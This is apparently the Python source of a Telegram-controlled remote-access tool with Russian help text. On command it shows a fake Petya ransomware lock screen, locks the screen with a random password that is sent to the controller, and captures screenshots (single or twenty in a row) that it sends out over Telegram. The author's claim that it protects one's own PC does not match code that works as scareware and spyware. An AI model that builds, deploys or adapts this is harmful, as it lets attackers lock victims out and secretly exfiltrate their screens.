import telebot
import subprocess
from telebot import types
import lockscreen_password_topmost
import petya_screen_topmost
import sender
import pyautogui
import random
import os

token = ''

bot = telebot.TeleBot(token)


# @bot.message_handler(commands=['//command\\'])
# def onStart(message):
#   //script\\

def send(msg):
    send.send(msg)


def lockbypass(passwdw):
    lockscreen_password_topmost.run_lock(passwdw)


@bot.message_handler(commands=['start'])
def onStart(message):
    bot.send_message(message.chat.id, "Бот успешно запущен!")


@bot.message_handler(commands=['help'])
def help(message):
    bot.send_message(message.chat.id,
                     "info (ну итак понятно)\nsend_msg (отправляет сообщение)\nlockscreen (блокировка экрана в виде вируса пети)\nlockscreenpass (блокировка экрана паролем, длина пароля 18 символов, будет отослан в телеграм)\nduo_lock (комбинация: сначало пароль и после разблокировки петя)\nscreen (отправляет скриншот в телеграм)\nlast_20_screens (отпровляет 20 скриншотов подряд)")


@bot.message_handler(commands=['info'])
def onStart(message):
    bot.send_message(message.chat.id,
                     "Немного о создателе:\nЭто ютубер MrGrief, ссылка на ютуб: https://www.youtube.com/channel/UCQ1lP_5tJ3TXiwz1IIaoTeg.\nЭтот скрипт был написан в цели обезопасить свой пк.")


@bot.message_handler(commands=['lockscreen'])
def lockscreen(message):
    petya_screen_topmost.run()


@bot.message_handler(commands=['lockscreenpass'])
def lockscreenpass(message):
    password = str(random.randint(111111111111111111, 999999999999999999))
    bot.send_message(message.chat.id, "Пароль для разблокировки: " + password)
    lockbypass(password)


@bot.message_handler(commands=['duo_lock'])
def lockscreenpass(message):
    password = str(random.randint(111111111111111111, 999999999999999999))
    bot.send_message(message.chat.id, "Пароль для разблокировки: " + password)
    lockbypass(password)
    petya_screen_topmost.run()


@bot.message_handler(commands=['send_msg'])
def sendd(message):
    bot.send_message(message.chat.id, "Введите текст для отправки: ")

    @bot.message_handler(content_types=['text'])
    def sendmsg(message):
        sender.send(message.text)


@bot.message_handler(commands=['screen'])
def sendd(message):
    pyautogui.screenshot("new_screen.png")
    img = open('new_screen.png', 'rb')
    bot.send_photo(message.chat.id, img)
    img.close()

@bot.message_handler(commands=['last_20_screens'])
def sendds(message):
    for i in range(0, 20):
        pyautogui.screenshot("new_screen.png")
        img = open('new_screen.png', 'rb')
        bot.send_photo(message.chat.id, img)
        img.close()

# start
bot.polling(none_stop=True) 